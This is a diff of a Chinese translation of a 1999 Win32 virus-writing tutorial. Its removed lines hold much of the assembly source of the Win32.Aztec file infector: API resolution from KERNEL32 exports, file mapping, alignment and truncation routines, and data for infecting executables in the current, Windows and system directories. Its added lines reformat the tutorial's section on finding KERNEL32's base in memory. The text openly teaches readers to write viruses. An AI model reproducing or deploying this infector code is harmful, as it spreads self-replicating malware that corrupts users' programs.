- ;   或 MapViewOfFileEx 函数返回的值。  
- ;                                                                           
- ; 返回值  
- ; =====  
- ;                                                                          
- ; ?如果函数调用成功，返回值是非 0 值，而且所有指定范围内的页将会标志"lazily"。  
- ;                                                                            
- ; ?如果函数调用失败，返回值是 0。为了获得详细的错误信息，调用 GetLastError 函数。  
- ;                                                                            
- ; ---                                                                        
- ;                                                                            
- ; CloseHandle 函数关闭一个打开对象的句柄。  
- ;                                                                            
- ; BOOL CloseHandle(                                                          
- ;   HANDLE hObject      // 要关闭对象的句柄  
- ;  );                                                                        
- ;                                                                            
- ; 参数  
- ; ====  
- ;                                                                            
- ; ?hObject: 指一个打开对象的句柄。  
- ;                                                                            
- ;  返回值  
- ;  ======  
- ;                                                                            
- ; ?如果函数调用成功，返回值是非 0 值。  
- ; ?如果函数调用失败，返回值是 0。想要获得详细的错误信息，调用 GetLastError。  
- ;  
- ;---------------------------------------------------------------------------  
-  
-GetK32          proc  
-\_@1:    cmp     word ptr \[esi\],"ZM"  
-        jz      WeGotK32  
-\_@2:    sub     esi,10000h  
-        loop    \_@1  
-WeFailed:  
-        mov     ecx,cs  
-        xor     cl,cl  
-        jecxz   WeAreInWNT  
-        mov     esi,kernel\_  
-        jmp     WeGotK32  
-WeAreInWNT:  
-        mov     esi,kernel\_wNT  
-WeGotK32:  
-        xchg    eax,esi  
-        ret  
-GetK32          endp  
-  
-GetAPIs         proc  
-@@1:    push    esi  
-        push    edi  
-        call    GetAPI  
-        pop     edi  
-        pop     esi  
-  
-        stosd  
-  
-        xchg    edi,esi  
-  
-        xor     al,al  
-@@2:    scasb  
-        jnz     @@2  
-  
-        xchg    edi,esi  
-  
-@@3:    cmp     byte ptr \[esi\],0BBh  
-        jnz     @@1  
-  
-        ret  
-GetAPIs         endp  
-  
-GetAPI          proc  
-        mov     edx,esi  
-        mov     edi,esi  
-  
-        xor     al,al  
-@\_1:    scasb  
-        jnz     @\_1  
-  
-        sub     edi,esi                         ; EDI = API 的名字大小  
-        mov     ecx,edi  
-  
-        xor     eax,eax  
-        mov     esi,3Ch  
-        add     esi,\[ebp+kernel\]  
-        lodsw  
-        add     eax,\[ebp+kernel\]  
-  
-        mov     esi,\[eax+78h\]  
-        add     esi,1Ch  
-  
-        add     esi,\[ebp+kernel\]  
-  
-        lea     edi,\[ebp+AddressTableVA\]  
-          
-        lodsd  
-        add     eax,\[ebp+kernel\]  
-        stosd  
-  
-        lodsd  
-        add     eax,\[ebp+kernel\]  
-        push    eax                             ; mov \[NameTableVA\],eax   =)  
-        stosd  
-  
-        lodsd  
-        add     eax,\[ebp+kernel\]  
-        stosd  
-          
-        pop     esi  
-  
-        xor     ebx,ebx  
-  
-@\_3:    lodsd  
-        push    esi        
-        add     eax,\[ebp+kernel\]  
-        mov     esi,eax  
-        mov     edi,edx  
-        push    ecx  
-        cld  
-        rep     cmpsb  
-        pop     ecx  
-        jz      @\_4  
-        pop     esi  
-        inc     ebx  
-        jmp     @\_3                
-  
-@\_4:  
-        pop     esi  
-        xchg    eax,ebx  
-        shl     eax,1  
-        add     eax,dword ptr \[ebp+OrdinalTableVA\]  
-        xor     esi,esi  
-        xchg    eax,esi  
-        lodsw  
-        shl     eax,2  
-        add     eax,dword ptr \[ebp+AddressTableVA\]  
-        mov     esi,eax  
-        lodsd  
-        add     eax,\[ebp+kernel\]  
-        ret  
-GetAPI          endp  
-  
- ;---------------------------------------------------------------------------  
- ; 上面所有的代码以前已经见过了，这里是有了一点点优化，所以你可以看看你自己用其它  
- ; 方法该怎么做。  
- ;---------------------------------------------------------------------------  
-  
- ; 输入:  
- ;      EAX - 对齐的值  
- ;      ECX - 对齐因子  
- ; 输出:  
- ;      EAX - 对齐值  
-  
-Align           proc  
-        push    edx  
-        xor     edx,edx  
-        push    eax  
-        div     ecx  
-        pop     eax  
-        sub     ecx,edx  
-        add     eax,ecx  
-        pop     edx  
-        ret  
-Align           endp  
-  
- ;---------------------------------------------------------------------------  
- ; 这个函数执行在 PE 感染中非常重要的一件事情：把数字和指定的因子对齐。如果你不是  
- ; 一个 d0rk，你就不必问我它是怎么工作的了。( Fuck,你到底学了没有？)  
- ;---------------------------------------------------------------------------  
- ; 输入:  
- ;      ECX - 要截的文件  
- ; 输出:  
- ;      无.  
-  
-TruncFile       proc  
-        xor     eax,eax  
-        push    eax  
-        push    eax  
-        push    ecx  
-        push    dword ptr \[ebp+FileHandle\]  
-        call    \[ebp+\_SetFilePointer\]  
-  
-        push    dword ptr \[ebp+FileHandle\]  
-        call    \[ebp+\_SetEndOfFile\]  
-        ret  
-TruncFile       endp  
-  
- ;---------------------------------------------------------------------------  
- ; SetFilePointer 使文件指针指向一个打开的文件。  
- ;                                                                            
- ; DWORD SetFilePointer(                                                      
- ;   HANDLE hFile,       // 文件的句柄  
- ;   LONG lDistanceToMove,       // 需要移动文件指针的字节数  
- ;   PLONG lpDistanceToMoveHigh, // 要移动距离的高位字  
- ;                                 
- ;   DWORD dwMoveMethod  // 怎么移  
- ;  );                                                           
- ;                                                               
- ; 参数  
- ; ====  
- ;                                                                            
- ; ?hFile: 指需要移动移动文件指针的文件。这个文件句柄必须是用 GENERIC\_READ 或 GENERIC\_WRITE   
- ;   方式创建的。  
- ;                                                                            
- ; ?lDistanceToMove: 指要移动文件指针的字节数。一个正值表示指针向前移动，而一个负  
- ;   值表示文件指针向后移动。  
- ;                                                                            
- ; ?lpDistanceToMoveHigh: 指向 64 位距离的高位字。如果这个参数的值是 NULL,SetFilePointer  
- ;   只能操作最大为 2³² - 2 的文件。如果这个参数被指定了，最大文件大小是 2⁶⁴ - 2。  
- ;   这个参数还获取新文件指针的高位值。  
- ;                                                                            
- ; ?dwMoveMethod: 指示文件指针移动的开始的地方。这个参数可以是下面的一个值  
- ;                                                                            
- ;        值          方式                                               
- ;                                                                            
- ;   + FILE\_BEGIN   - 开始点是 0 或文件开始。如果指定了 FILE\_BEGIN，DistanceToMove  
- ;                    被理解为新文件指针的位置。  
- ;   + FILE\_CURRENT - 当前文件指针的值是开始点。  
- ;   + FILE\_END     - 当前文件尾是开始点。  
- ;                                                                            
- ; 返回值  
- ; ======  
- ;                                                                            
- ; ?如果 SetFilePointer 函数调用成功，返回值是双字新文件指针的低位值，而且如果  
- ;   lpDistanceToMoveHigh 不是 NULL，这个函数把新文件指针的双字的高位赋给由那个参  
- ;   数指向的长整型。  
- ; ?如果函数调用失败而且 lpDistanceToMoveHigh 是 NULL，返回值是 0xFFFFFFFF。想要  
- ;   获得详细的错误信息，调用 GetLastError 函数。  
- ; ?如果函数失败，而且 lpDistanceToMoveHigh 是非-NULL 的，返回值是 0xFFFFFFFF，而且  
- ;   GetLastError 将返回一个值而不 NO\_ERROR。  
- ;                                                                            
- ; ---                                                                        
- ;                                                                            
- ; SetEndOfFile 函数把指定文件的 end-of-file (EOF)位置移到文件指针的当前位置。  
- ;                                                                            
- ; BOOL SetEndOfFile(                                                         
- ;   HANDLE hFile        // 要设置 EOF 的文件的句柄  
- ;  );                                                                        
- ;                                                                            
- ; 参数  
- ; ====  
- ;                                                                            
- ; ?hFile: 指示要移动 EOF 位置的文件。这个句柄必须是以 GENERIC\_WRITE 访问文件方式  
- ;   创建的。  
- ;                                                                            
- ; 返回     
- ; ====  
- ;                                                                            
- ; ?如果函数调用成功，返回值是非 0 值  
- ; ?如果函数调用失败，返回值是 0。想要知道详细的错误信息，调用 GetLastError 函数。  
- ;                                                                          ;  
- ;---------------------------------------------------------------------------  
-  
- ; 输入:  
- ;      ESI - 指向要打开的文件的名字  
- ; 输出:  
- ;      EAX - 如果成功是文件的句柄。  
-  
-OpenFile        proc  
-        xor     eax,eax  
-        push    eax  
-        push    eax  
-        push    00000003h  
-        push    eax  
-        inc     eax  
-        push    eax  
-        push    80000000h or 40000000h  
-        push    esi  
-        call    \[ebp+\_CreateFileA\]  
-        ret  
-OpenFile        endp  
-  
- ;---------------------------------------------------------------------------  
- ; CreateFile 函数创建或打开下面的对象，并返回一个可以访问这个对象的句柄：  
- ;                                                                            
- ;      + 文件 (我们只对这个感兴趣)                          
- ;      + pipes                                                               
- ;      + mailslots                                                           
- ;      + communications resources                                            
- ;      + disk devices (Windows NT only)                                      
- ;      + consoles                                                            
- ;      + directories (open only)                                             
- ;                                                                            
- ; HANDLE CreateFile(                                                         
- ;   LPCTSTR lpFileName, //  指向文件的名字  
- ;   DWORD dwDesiredAccess,      // 访问 (读-写) 模式  
- ;   DWORD dwShareMode,  // 共享模式  
- ;   LPSECURITY\_ATTRIBUTES lpSecurityAttributes, // 指向安全属性  
- ;   DWORD dwCreationDistribution,       // 怎么创建  
- ;   DWORD dwFlagsAndAttributes, // 文件属性  
- ;   HANDLE hTemplateFile        // 要复制的属性的文件的句柄  
- ;  );                                                                        
- ;                                                                            
- ; 参数  
- ; ====  
- ;                                                                            
- ; ?lpFileName: 指向一个以 NULL 结尾的字符串，这个字符串指定要创建或打开的对象(文件,  
- ;    管道, 邮槽, 通信资源, 磁盘设备, 控制台, 或目录)的名字。  
- ;    如果\*lpFileName 是一个路径，就有一个缺省的路径字符个数的 MAX\_PATH 个数限制，  
- ;    这个限制和 CreateFile 函数怎么解析路径有关。  
- ;                                                                           
- ; ?dwDesiredAccess: 指访问的对象的类型。一个应用程序可以获得读访问，写访问，读-写  
- ;   访问，或者设备查询访问。  
- ;                                                                            
- ; ?dwShareMode: 设置一些标志来指定对象是怎么共享的。如果 dwShareMode 是 0，这个对象  
- ;   就不能关系。随后的对这个对象的打开操作也会失败，直到句柄被关闭。  
- ;                                                                         
- ; ?lpSecurityAttributes: 指向一个 SECURITY\_ATTRIBUTES 结构，来确定返回的句柄是  
- ;   否能从子进程继承。如果 lpSecurityAttributes 是 NULL，句柄就不能继承。  
- ;                                                                            
- ; ?dwCreationDistribution: 指对文件采取已知的什么行动，和未知的行动。  
- ;                                                                            
- ; ?dwFlagsAndAttributes: 指文件的属性和标志。  
- ;                                                                            
- ; ?hTemplateFile:指用 GENERIC\_READaccess 访问一个模板文件的句柄。这个模板文件在  
- ;   文件创建的时候提供文件属性和扩展的属性。Windows 95:这个值必须为 NULL。如果你  
- ;   在 Windows 95 下提供一个句柄，这个调用会失败而且 GetLastError 返回  
- ;   ERROR\_NOT\_SUPPORTED。  
- ;                                                                            
- ; 返回值      
- ; ======  
- ;                                                                            
- ; ?如果函数成功了，返回值是一个打开的指定文件的句柄。如果指定的文件在函数调用前存  
- ;   在和 dwCreationDistribution 是 CREATE\_ALWAYS 或 OPEN\_ALWAYS 的时候，一个调用  
- ;   GetLastError 函数会返回 ERROR\_ALREADY\_EXISTS(甚至函数成功了)。如果文件在   
- ;   调用之前不存在，GetLastError 将返回 0。  
- ; ?如果函数失败了，返回值是 INVALID\_HANDLE\_VALUE。为了获取信息的错误信息，调用 GetLastError。  
- ;---------------------------------------------------------------------------  
-  
- ; 输入:  
- ;      ECX - 映射大小  
- ; 输出:  
- ;      EAX - 如果成功为映射句柄  
-  
-CreateMap       proc  
-        xor     eax,eax  
-        push    eax  
-        push    ecx  
-        push    eax  
-        push    00000004h  
-        push    eax  
-        push    dword ptr \[ebp+FileHandle\]  
-        call    \[ebp+\_CreateFileMappingA\]  
-        ret  
-CreateMap       endp  
-  
- ;---------------------------------------------------------------------------  
- ; CreateFileMapping 函数为指定文件创建一个命名的或未命名的文件映射对象。  
- ;                                                                            
- ; HANDLE CreateFileMapping(                                                  
- ;   HANDLE hFile,       // 要映射的文件的句柄  
- ;   LPSECURITY\_ATTRIBUTES lpFileMappingAttributes, // 可选安全属性  
- ;   DWORD flProtect,    // 为映射对象保护  
- ;   DWORD dwMaximumSizeHigh,    // 32 位对象大小的高位  
- ;   DWORD dwMaximumSizeLow,     // 32 位对象大小的低位  
- ;   LPCTSTR lpName      // 文件映射对象的名字  
- ;  );   
- ;  
- ; 参数  
- ; ====             
- ;                                                                          ;  
- ; ?hFile: 指从哪个文件创建映射对象。这个文件必须以和由 flProtect 参数指定的包含标  
- ;   志相兼容的访问模式打开。建议，虽然不是必须，你打算映射的文件应该以独占方式打  
- ;   开。  
- ;   如果 hFile 是 (HANDLE)0xFFFFFFFF，调用进程还必须在 dwMaximumSizeHigh 和  
- ;   dwMaximumSizeLow 参数中指定映射对象的大小。这个函数是通过操作系统的页文件  
- ;   而不是文件系统中的命名文件来创建一个指定大小的文件映射对象的。文件映射对象  
- ;   可通过复制，继承或命名来共享。  
- ;                                                                            
- ; ?lpFileMappingAttributes: 指向一个 SECURITY\_ATTRIBUTES 结构，决定返回的句柄是  
- ;   否可以被子进程继承。如果 lpFileMappingAttributes 是 NULL,句柄就不能被继承。  
- ;                                                                            
- ; ?flProtect: 指定当文件被映射的时候文件需要的保护。  
- ;                                                                            
- ; ?dwMaximumSizeHigh: 指定文件映射对象的 32 位最大大小的高位。  
- ;                                                                            
- ; ?dwMaximumSizeLow: 指定文件映射对象的 32 位最大大小的低位。如果这个参数和  
- ;   dwMaximumSizeHig 为 0，那么文件映射对象的最大大小等于有 hFile 确定的文件的  
- ;   当前大小。  
- ;                                                                            
- ; ?lpName: 指向一个 NULL 结尾的字符串来指定映射对象的名字。这个名字可以包含除了反  
- ;   斜线符号(\\)之外的所有字符。  
- ;   如果这个参数和已经存在的命名了的映射对象的名字相同，这个函数请求通过由 flProtect  
- ;   指定的保护来访问映射对象。  
- ;   如果参数是 NULL，映射对象就不通过命名创建。  
- ;                                                                            
- ; 返回值  
- ; ======  
- ;                                                                            
- ; ?如果函数成功，返回值是一个文件映射对象的句柄。如果在调用这个函数之前对象已经  
- ;   存在了，GetLastError 函数将返回 ERROR\_ALREADY\_EXISTS，而且返回值是一个已  
- ;   经存在的文件映射对象(由当前的大小，而不是新的指定大小)的合法句柄。如果映射  
- ;   对象不存在，GetLastError 返回 0。  
- ; ?如果函数失败，返回值是 NULL。想要知道详细的错误信息，调用 GetLastError 函数。  
- ;---------------------------------------------------------------------------  
-  
- ; input:  
- ;      ECX - Size to map  
- ; output:  
- ;      EAX - MapAddress if succesful  
-  
-MapFile         proc  
-        xor     eax,eax  
-        push    ecx  
-        push    eax  
-        push    eax  
-        push    00000002h  
-        push    dword ptr \[ebp+MapHandle\]  
-        call    \[ebp+\_MapViewOfFile\]  
-        ret  
-MapFile         endp  
-  
- ;---------------------------------------------------------------------------  
- ; MapViewOfFile 函数映射一个文件视图到调用进程的地址空间中去。  
- ;                                                                           
- ; LPVOID MapViewOfFile(                                                      
- ;   HANDLE hFileMappingObject,  // 要映射的文件映射对象               
- ;   DWORD dwDesiredAccess,      // 访问模式                               
- ;   DWORD dwFileOffsetHigh,     // 32 位文件偏移地址的高位        
- ;   DWORD dwFileOffsetLow,      // 32 位文件偏移地址的低位         
- ;   DWORD dwNumberOfBytesToMap  // 要映射的字节数                    
- ;  );                                                                        
- ;                                                                            
- ;                                                                            
- ; 参数    
- ; ====  
- ;                                                                            
- ; ?hFileMappingObject: 指定一个打开的文件映射对象的句柄。CreateFileMapping 和   
- ;   OpenFileMapping 函数返回这个句柄。   
- ;                                                                            
- ; ?dwDesiredAccess: 指访问文件视图的类型，而且因此页的保护由这个文件映射。  
- ;                                                                            
- ; ?dwFileOffsetHigh: 指映射开始的偏移地址的高 32 位。  
- ;                                                                            
- ; ?dwFileOffsetLow: 指映射开始的偏移地址的低 32 位。  
- ;                                                                            
- ; ?dwNumberOfBytesToMap: 指文件映射的字节数。如果 dwNumberOfBytesToMap 是 0，那么  
- ;   整个文件将被映射。  
- ;                                                                            
- ; 返回值  
- ; ======  
- ;                                                                            
- ; ?如果函数调用成功，返回值是映射视图开始的地址。  
- ; ?如果函数调用失败，返回值是 NULL。想要知道详细的错误信息，调用 GetLastError。  
- ;---------------------------------------------------------------------------  
-  
-mark\_   db      "\[Win32.Aztec v1.01\]",0  
-        db      "(c) 1999 Billy Belcebu/iKX",0  
-  
-EXE\_MASK        db      "\*.EXE",0  
-  
-infections      dd      00000000h  
-kernel          dd      kernel\_  
-  
-@@Namez                 label   byte  
-  
-@FindFirstFileA         db      "FindFirstFileA",0  
-@FindNextFileA          db      "FindNextFileA",0  
-@FindClose              db      "FindClose",0  
-@CreateFileA            db      "CreateFileA",0  
-@SetFilePointer         db      "SetFilePointer",0  
-@SetFileAttributesA     db      "SetFileAttributesA",0  
-@CloseHandle            db      "CloseHandle",0  
-@GetCurrentDirectoryA   db      "GetCurrentDirectoryA",0  
-@SetCurrentDirectoryA   db      "SetCurrentDirectoryA",0  
-@GetWindowsDirectoryA   db      "GetWindowsDirectoryA",0  
-@GetSystemDirectoryA    db      "GetSystemDirectoryA",0  
-@CreateFileMappingA     db      "CreateFileMappingA",0  
-@MapViewOfFile          db      "MapViewOfFile",0  
-@UnmapViewOfFile        db      "UnmapViewOfFile",0  
-@SetEndOfFile           db      "SetEndOfFile",0  
-                        db      0BBh  
-  
-                        align   dword  
-virus\_end               label   byte  
-  
-heap\_start              label   byte  
-  
-                        dd      00000000h  
-  
-NewSize                 dd      00000000h  
-SearchHandle            dd      00000000h  
-FileHandle              dd      00000000h  
-MapHandle               dd      00000000h  
-MapAddress              dd      00000000h  
-AddressTableVA          dd      00000000h  
-NameTableVA             dd      00000000h  
-OrdinalTableVA          dd      00000000h  
-  
-@@Offsetz               label   byte  
-\_FindFirstFileA         dd      00000000h  
-\_FindNextFileA          dd      00000000h  
-\_FindClose              dd      00000000h  
-\_CreateFileA            dd      00000000h  
-\_SetFilePointer         dd      00000000h  
-\_SetFileAttributesA     dd      00000000h  
-\_CloseHandle            dd      00000000h  
-\_GetCurrentDirectoryA   dd      00000000h  
-\_SetCurrentDirectoryA   dd      00000000h  
-\_GetWindowsDirectoryA   dd      00000000h  
-\_GetSystemDirectoryA    dd      00000000h  
-\_CreateFileMappingA     dd      00000000h  
-\_MapViewOfFile          dd      00000000h  
-\_UnmapViewOfFile        dd      00000000h  
-\_SetEndOfFile           dd      00000000h  
-  
-MAX\_PATH                equ     260  
-  
-FILETIME                STRUC  
-FT\_dwLowDateTime        dd      ?  
-FT\_dwHighDateTime       dd      ?  
-FILETIME                ENDS  
-  
-WIN32\_FIND\_DATA         label   byte  
-WFD\_dwFileAttributes    dd      ?  
-WFD\_ftCreationTime      FILETIME ?  
-WFD\_ftLastAccessTime    FILETIME ?  
-WFD\_ftLastWriteTime     FILETIME ?  
-WFD\_nFileSizeHigh       dd      ?  
-WFD\_nFileSizeLow        dd      ?  
-WFD\_dwReserved0         dd      ?  
-WFD\_dwReserved1         dd      ?  
-WFD\_szFileName          db      MAX\_PATH dup (?)  
-WFD\_szAlternateFileName db      13 dup (?)  
-                        db      03 dup (?)  
-  
-directories             label   byte  
-  
-WindowsDir              db      7Fh dup (00h)  
-SystemDir               db      7Fh dup (00h)  
-OriginDir               db      7Fh dup (00h)  
-dirs2inf                equ     (($-directories)/7Fh)  
-mirrormirror            db      dirs2inf  
-  
-heap\_end                label   byte  
-  
- ;---------------------------------------------------------------------------  
- ; 上面所有的都是病毒要使用的数据;)  
- ;---------------------------------------------------------------------------  
-  
-; First generation host  
-  
-fakehost:  
-        pop     dword ptr fs:\[0\]                ; 清除堆栈  
-        add     esp,4  
-        popad  
-        popfd  
-  
-        xor     eax,eax                         ; 用第一次生成的无聊的信息显示 MessageBox   
-        push    eax                               
-        push    offset szTitle  
-        push    offset szMessage  
-        push    eax  
-        call    MessageBoxA  
-  
-        push    00h                             ; 终止第一次生成  
-        call    ExitProcess  
-  
-end     aztec  
-;------到这儿为止剪切-------------------------------------------------------  
-  
-     好了，我认为关于这个病毒我已经解释得够清楚了。它只是一个简单的直接行为(运行期)病毒，能够在所有的 Win32 平台上工作，而且在当前目录，windows 目录和系统目录上感染 5 个文件。它没有任何隐藏自己的机制(因为它是一个示例病毒)，而且我想它能够被所有的反病毒软件检测到。所以它不值得改变字符串并声称是它的作者。你应该自己做。因为我知道病毒的一些部分还不够清晰(如那些调用 API 函数，如完成一个任务用的值)，下面就简要地列举出怎么调用一些 API 来做具体地事情。  
-  
-\-> 怎么打开一个文件进行读写?  
-  
-我们用来做这个的 API 是 CreateFileA。建议参数如下：  
-  
-        push    00h                             ; hTemplateFile  
-        push    00h                             ; dwFlagsAndAttributes  
-        push    03h                             ; dwCreationDistribution  
-        push    00h                             ; lpSecurityAttributes  
-        push    01h                             ; dwShareMode  
-        push    80000000h or 40000000h          ; dwDesiredAccess  
-        push    offset filename                 ; lpFileName  
-        call    CreateFileA  
-  
- + hTemplateFile, dwFlagsAndAttributes 和 lpSecurityAttributes 应该为 0。  
-  
- + dwCreationDistribution, 有一些有趣的值。 它可以为:  
-  
- CREATE\_NEW        = 01h   
- CREATE\_ALWAYS     = 02h  
- OPEN\_EXISTING     = 03h  
- OPEN\_ALWAYS       = 04h  
- TRUNCATE\_EXISTING = 05h  
-  
-    当我们想要打开一个已经存在的文件的时候，我们使用 OPEN\_EXISTING，即 03h。如果我们因为病毒的需要而要打开一个模板文件，我们在这里将要使用另外一个值，如 CREATE\_ALWAYS。  
-  
-+ dwShareMode 应该为 01h, 总之，我们可以从下面的值中选择:  
-  
- FILE\_SHARE\_READ   = 01h  
- FILE\_SHARE\_WRITE  = 02h  
-  
-所有文我们让其它人读我们打开的文件，但是不能写!  
-  
- + dwDesiredAccess 处理访问文件的选择。 我们使用 C0000000h,因为它是 GENERIC\_READ 和 GENERIC\_WRITE 的和，那就意味着我们两个访问方式都要:)下面你得到:  
-  
- GENERIC\_READ      = 80000000h  
- GENERIC\_WRITE     = 40000000h  
-  
-\*\* 如果有一个失败，这个调用 CreateProcess 将会返回给我们 0xFFFFFFFF；如果没有任何失败，它将返回给我们打开文件的句柄，所以，我们将它保存到相关变量中。要关闭那个句柄(需要的时候)使用 CloseHandle 这个 API 函数。  
-  
- -> 怎样创建一个打开文件的映射?  
-  
-    要用到的 API 是 CreateFileMappingA。建议的参数为：      
-  
-        push    00h                             ; lpName  
-        push    size\_to\_map                     ; dwMaximumSizeLow  
-        push    00h                             ; dwMaximumSizeHigh  
-        push    04h                             ; flProtect  
-        push    00h                             ; lpFileMappingAttributes  
-        push    file\_handle                     ; hFile  
-        call    CreateFileMappingA  
-  
- + lpName 和 lpFileMappingAttributes 建议为 0。  
- + dwMaximumSizeHigh 应该为 0 除非当 dwMaximumSizeLow < 0xFFFFFFFF  
- + dwMaximumSizeLow 是我们想要映射的大小  
- + flProtect 可以为如下的值:  
-  
- PAGE\_NOACCESS     = 00000001h  
- PAGE\_READONLY     = 00000002h  
- PAGE\_READWRITE    = 00000004h  
- PAGE\_WRITECOPY    = 00000008h  
- PAGE\_EXECUTE      = 00000010h  
- PAGE\_EXECUTE\_READ = 00000020h  
- PAGE\_EXECUTE\_READWRITE = 00000040h  
- PAGE\_EXECUTE\_WRITECOPY = 00000080h  
- PAGE\_GUARD        = 00000100h  
- PAGE\_NOCACHE      = 00000200h  
-  
-    我建议你使用 PAGE\_READWRITE，那个在映射时读或写不出现问题。  
-  
- + hFile 是我们想要映射的先前打开的句柄。  
-  
- \*\* 如果失败了，调用这个 API 函数会返回给我们一个 NULL 值；否则将会返回给我们映射句柄。我们将把它保存到一个变量中以备后用。要关闭一个映射句柄，要调用的 API 应该为 CloseHandle。  
-  
- -> 怎么能映射文件?  
-  
-    应该用 MapViewOfFile 这个 API 函数，它的建议参数如下：  
-  
-        push    size\_to\_map                     ; dwNumberOfBytesToMap  
-        push    00h                             ; dwFileOffsetLow  
-        push    00h                             ; dwFileOffsetHigh  
-        push    02h                             ; dwDesiredAccess  
-        push    map\_handle                      ; hFileMappingObject  
-        call    MapViewOfFile  
-  
- + dwFileOffsetLow 和 dwFileOffsetHigh 应该为 0  
- + dwNumberOfBytesToMap 是我们想要映射的文件的字节数  
- + dwDesiredAccess 可以为如下值:  
-  
- FILE\_MAP\_COPY     = 00000001h  
- FILE\_MAP\_WRITE    = 00000002h  
- FILE\_MAP\_READ     = 00000004h  
-  
- 我建议 FILE\_MAP\_WRITE。  
-  
- + hFileMappingObject  应该为映射句柄( Mapping  Handle ), 由先前调用的 CreateFileMappingA 函数返回。  
-  
- \*\* 如果失败，这个 API  将会返回给我们 NULL, 否则它将返回给我们映射地址(Mapping Address)。所以，从那个映射地址，你可以访问映射空间的任何地方，并进行你想要的修改:)为了关闭那个映射地址，应该用 UnmapViewOfFile 这个 API。  
-  
- -> 怎么关闭文件句柄和映射句柄?  
-  
-    OK，我们必须使用 CloseHandle 这个 API。  
-  
-        push    handle\_to\_close                 ; hObject  
-        call    CloseHandle  
-  
- \*\* 如果关闭成功, 它返回 1。  
-  
- -> 怎么关闭映射地址?  
-  
-    你应该使用 UnmapViewOfFile。  
-  
-        push    mapping\_address                 ; lpBaseAddress  
-        call    UnmapViewOfFile  
-  
- \*\* 如果关闭成功，它返回 1。
+## Ring-3，在用户级下编程
 
- 4dd466d0e1e0cc123afbe504da2462ca
+嗯，用户级给了我们所有人很多令人压抑和不方便的限制，这是正确的，这妨碍了我们所崇拜的自由，这种我们在编写 `DOS` 病毒时所感受到的自由。但是，伙计，这就是生活，这就是我们的悲哀，这就是 `Micro$oft`。Btw，这是唯一的(当今)能够完全 `Win32` 兼容的病毒的方法，而且这个环境是未来，正如你必须知道的。首先，让我们看看怎么用一种非常简单的方法来获得 `KERNEL32` 的基址(为了 `Win32` 兼容性)：
+
+### 获得 KERNEL32 基址的一个简单方法
+
+正如你所知道的，当我们在执行一个应用程序的时候，代码是从 `KERNEL32` "call"一部分代码的(也就像 `KERNEL` 调用我们的代码一样)。而且，如果你还记得的话，当一个 `call` 调用之后，返回的地址是在堆栈里(即，在由 `ESP` 所指定的内存地址里的)的。让我们看看关于这个的一个实际例子：
+
+```asm
+;---------------从这里开始剪切---------------------------------------------
+        .586p                                ; Bah... simply for phun.
+        .model  flat                         ; Hehehe i love 32 bit stuph ;)
+        .data                                ; Some data (needed by TASM32/TLINK32)
+        db       ?
+        .code
+start:
+        mov     eax,[esp]                    ; Now EAX would be BFF8XXXXh (if w9X)
+                                             ; ie, somewhere inside the API
+                                             ; CreateProcess :)
+        ret                                  ; Return to it ;)
+end    start
+;------------到这里为止剪切--------------------------------------------------
+```
+
+相当简单。我们在 `EAX` 中得到一个值大约为 `BFF8XXXX`(`XXXX` 是一个不重要的值，这里这么写是因为不需要精确地知道它，再也不要拿那些无聊的东西来烦我了:))。因为 `Win32` 平台通常会对齐到一个页，我们可以搜索任何一个页的开头，而且因为 `KERNEL32` 头就在一个页的开头，我们能够很轻松地检查它。而且当我们找到我现在正在讨论的 `PE` 头的时候，我们就知道了 `KERNEL32` 的基址。嗯，作为限制，我们可以以 `50h` 页为限。呵呵，不要担心，下面是一些代码:)
+
+```asm
+;--------从这里开始剪切------------------------------------------------
+        .586p
+        .model  flat
+extrn   ExitProcess:PROC
+        .data
+limit   equ      5
+        db       0
+;--------------------------------------
+; 没有用而且没有意义的数据 :)
+;--------------------------------------
+        .code
+test:
+        call    delta
+delta:
+        pop     ebp
+        sub     ebp,offset delta
+        mov     esi,[esp]
+        and     esi,0FFFF0000h
+        call    GetK32
+        push    00000000h
+        call    ExitProcess
+;-------------------------------------
+; 呃，我认为你至少是一个普通 ASM 程序员, 所以我假定你知道指令的第一块是为了获得
+; 地址偏移变化量(特别在这个例子里面不需要，然而，我喜欢使得它就像我们的病毒代码)。
+; 第二块是我们所感兴趣的东西。我们把我们的程序开始调用的地址放在 ESI 中，即由 ESP
+; 所显示的地址(当然是如果我们在程序装载完后没有碰堆栈的情况下)。第二个指令，那个
+; AND，是为了获得我们的代码正在调用的页的开头。我们调用我们的例程，在这之后，我
+; 们结束处理:)
+;-------------------------------------
+GetK32:
+__1:
+        cmp     byte ptr [ebp+K32_Limit],00h
+        jz      WeFailed
+        cmp     word ptr [esi],"ZM"
+        jz      CheckPE
+__2:
+        sub     esi,10000h
+        dec     byte ptr [ebp+K32_Limit]
+        jmp     __1
+;-------------------------------------
+; 首先我们检查我们是否已经达到了我们的极限(50 页)。在这之后，我们检查是否在页的开
+; 头(它应该是)是否为 MZ 标志，而且如果找到了，我们继续检查 PE 头。如果没有，我们减
+; 去 10 页(10000h 字节)，我们增加限制变量，再次搜索
+;-------------------------------------
+CheckPE:
+        mov     edi,[esi+3Ch]
+        add     edi,esi
+        cmp     dword ptr [edi],"PE"
+        jz      WeGotK32
+        jmp     __2
+WeFailed:
+        mov     esi,0BFF70000h
+WeGotK32:
+        xchg    eax,esi
+        ret
+K32_Limit      dw       limit
+;--------------------------------------
+; 我们在 MZ 头开始后的偏移地址 3CH 处得到值(存着从哪儿开始 PE 头的 RVA)，我们把这个
+; 值和页的地址规范化，而且如果从这个偏移地址处的内存地址标志是 PE 标志，我们就假
+; 设已经找到了...而且我们确实是找到了!
+;--------------------------------------
+end      test
+;--------到这里为止剪切-----------------------------------------------------
+```
+
+一个建议：我测试了它，而且在 `Win98` 下和 `WinNT4 SP3` 下面没有给我们任何类型的问题，然而，我不知道在其它任何地方会发生什么，我建议你使用 `SEH` 来避免可能的页错误(和它们相关的蓝屏)。`SEH` 将会在后面介绍。嗨，`Lord Julus` 在他的教程里面所使用的方法(在感染文件里面搜索 `GetModuleHandleA` 函数)并不能很好地满足我的需要，无论如何，我将给出那个我自己版本的代码，在那里我将解释怎么来玩输入函数。例如，它在 `per-process` 驻留病毒里面要用到，在这个例程里面有一小点改变:)
+
+### 获取那些令人疯狂的 API 函数!!!
+
